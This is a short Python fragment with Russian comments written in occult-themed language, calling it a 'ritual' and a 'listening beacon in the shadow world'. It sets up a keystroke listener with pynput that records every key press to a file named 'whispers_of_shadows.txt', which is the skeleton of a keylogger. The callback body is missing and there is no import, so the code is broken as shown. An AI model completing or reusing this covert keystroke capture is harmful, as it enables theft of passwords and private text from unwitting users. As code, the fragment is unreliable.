log_file = "whispers_of_shadows.txt"

# Ритуал Записи: Заклинание, срабатывающее при каждом нажатии
def on_press(key):

# Маяк Прослушивания: Активируем прослушивание в теневом мире
with keyboard.Listener(on_press=on_press) as listener:
    listener.join() # Замыкаем круг, ждём вечно
